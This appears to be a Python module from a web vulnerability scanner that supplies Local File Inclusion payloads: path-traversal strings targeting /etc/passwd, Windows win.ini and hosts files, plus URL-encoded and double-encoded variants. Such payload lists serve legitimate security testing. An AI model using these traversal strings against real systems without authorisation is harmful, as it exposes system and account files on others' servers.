"""
===============================================================================
Local File Inclusion Payload Provider
===============================================================================
"""

from __future__ import annotations

from itertools import chain
from typing import Iterable


LINUX_PAYLOADS = (

    "../../../../etc/passwd",

    "../../../../../etc/passwd",

    "../../../../../../etc/passwd",

)

WINDOWS_PAYLOADS = (

    "..\\..\\..\\windows\\win.ini",

    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",

)

ENCODED_PAYLOADS = (

    "..%2f..%2f..%2fetc/passwd",

    "..%252f..%252fetc/passwd",

)

PAYLOAD_DATABASE = {

    "linux": LINUX_PAYLOADS,

    "windows": WINDOWS_PAYLOADS,

    "encoded": ENCODED_PAYLOADS,

}


class LFIPayloadProvider:

    def generate(self, vector) -> Iterable[str]:

        return chain.from_iterable(
            PAYLOAD_DATABASE.values()
        )